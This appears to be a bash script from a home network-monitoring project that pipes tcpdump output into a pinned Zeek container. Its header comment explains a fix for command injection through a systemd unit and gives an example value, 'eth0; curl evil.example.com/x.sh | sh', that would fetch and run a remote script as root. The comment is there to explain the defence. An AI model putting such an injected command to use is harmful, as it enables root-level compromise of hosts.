#!/usr/bin/env bash
# Suburban-SOC — configs/systemd/zeek-host-capture.service's tcpdump | Zeek
# capture pipeline, extracted into a checked-in script (#320).
#
# Previously ExecStart=/bin/bash -c 'tcpdump -i ${CAPTURE_IFACE} ... | docker
# run ...' directly in the unit file. systemd substitutes ${CAPTURE_IFACE}
# into that ExecStart= line BEFORE bash ever sees it — so the substituted
# value became part of a string bash itself then re-parses, and a value like
# `eth0; curl evil.example.com/x.sh | sh` written to
# /etc/default/zeek-host-capture (already requires root to write, but
# invisible to any repo diff since that file is untracked, unlike this unit)
# would execute as root on the unit's next restart. Called as a plain argv
# element instead (no `bash -c` wrapper on the ExecStart= line — see the
# unit file itself), systemd hands CAPTURE_IFACE to bash as a single,
# already-split word: quoted "$IFACE" below never reaches a shell parser
# that could re-interpret it.
#
# Usage: host_capture.sh <capture-iface> <soc-repo-path>

set -o pipefail

IFACE="$1"
SOC_REPO="$2"

# The Zeek image below is pinned to a specific tag+digest, not :latest — see
# configs/systemd/zeek-host-capture.service's header comment (#293/#364) for
# why and the deliberate bump procedure. Keep in lockstep with the other 3
# real capture paths (stream_capture.sh, zeek_connect_host.sh,
# zeek_run_pcap.sh); tests/pipeline/test_zeek_image_pin.py enforces it.
/usr/bin/tcpdump -i "$IFACE" -s 0 -U -w - | /usr/bin/docker run -i --rm --name zeek-host-capture \
  -v /storage/PCAP/zeek_logs:/data/zeek_logs \
  -v /storage/PCAP/intel:/data/intel \
  -v "${SOC_REPO}/scripts/setup/configs/zeek:/data/policy:ro" \
  -w /data/zeek_logs \
  zeek/zeek:8.2.1@sha256:eca2b3915d3e067cbb4a904f23f4c4f461ea2b60613ab30f7ee77bbc707c87c7 \
  zeek -C -r - LogAscii::use_json=T /data/intel/config.zeek /data/policy/scan-detection.zeek \
    policy/protocols/ssh/detect-bruteforcing
